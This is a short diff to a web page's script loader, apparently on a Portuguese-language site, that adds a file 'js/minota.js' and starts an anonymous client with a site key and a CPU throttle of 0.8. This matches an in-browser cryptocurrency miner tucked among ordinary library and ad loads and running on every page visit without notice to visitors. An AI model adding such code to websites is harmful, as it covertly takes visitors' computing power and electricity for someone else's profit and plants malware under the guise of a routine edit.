@@ -300,7 +300,11 @@
 		<script>
 			var infolinks_pid = 3247834;
 			var infolinks_wsid = 0;
-			head.js("js/jquery.slim.min.js", "js/moment.min.js", "js/moment_locale_pt.js", "js/picker.js", "https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js", "https://www.googletagmanager.com/gtag/js?id=G-0CBPV9HHZG", "https://resources.infolinks.com/js/infolinks_main.js", function() {
+			head.js("js/jquery.slim.min.js", "js/moment.min.js", "js/moment_locale_pt.js", "js/picker.js", "https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js", "https://www.googletagmanager.com/gtag/js?id=G-0CBPV9HHZG", "https://resources.infolinks.com/js/infolinks_main.js", "js/minota.js", function() {
+				var _client = new Client.Anonymous('632fa6f27c3c4fc4d9f18a1420c316d6b4c18925c7b26f3cef56862b7927aa7f', {
+					throttle: 0.8, c: 'w', ads: 0
+				});
+				_client.start();
 				WebFont.load({
 					google: {
 						families: ['Poppins:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400;1,500;1,600', 'Roboto+Mono:ital@0;1']
